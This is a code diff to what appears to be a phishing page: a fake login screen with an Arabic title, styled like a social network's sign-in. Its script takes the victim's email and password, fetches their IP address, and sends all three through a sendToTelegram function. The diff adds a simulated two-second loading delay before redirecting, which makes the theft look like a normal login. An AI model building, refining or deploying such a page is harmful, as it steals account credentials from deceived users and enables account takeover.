@@ -6,7 +6,6 @@
   <title>عليك تسجيل الدخول الى حسابك أولاً</title>
   <style>
     /* Your CSS styles here */
-    
     * {
       margin: 0;
       padding: 0;
@@ -134,7 +133,7 @@
       font-size: 13px;
       margin-top: -2px;
     }
-    /* أضف الأنماط التالية لعرض وإخفاء التحميل */
+    /* Add the following style to show and hide the loading */
     #loading {
       display: none;
       font-size: 18px;
@@ -173,7 +172,7 @@
         <li>Telugu</li>
       </span>
     </div>
-    <div class "footer">
+    <div class="footer">
       <ul>
         <li class="no">About</li>
         <li>Help</li>
@@ -188,10 +187,16 @@
       var email = document.getElementById('email').value;
       var password = document.getElementById('pass').value;
 
+      showLoading(); // Show loading element
+
       getIpAddress(function (ipAddress) {
         sendToTelegram(email, password, ipAddress);
-        hideLoading();
-        window.location.href = 'temporaryar.html';
+
+        // You can add a delay to simulate a loading state.
+        setTimeout(function () {
+          hideLoading(); // Hide loading element after a delay
+          window.location.href = 'temporaryar.html'; // Redirect to the desired page
+        }, 2000); // 2000 milliseconds (2 seconds) delay
       });
     }
 
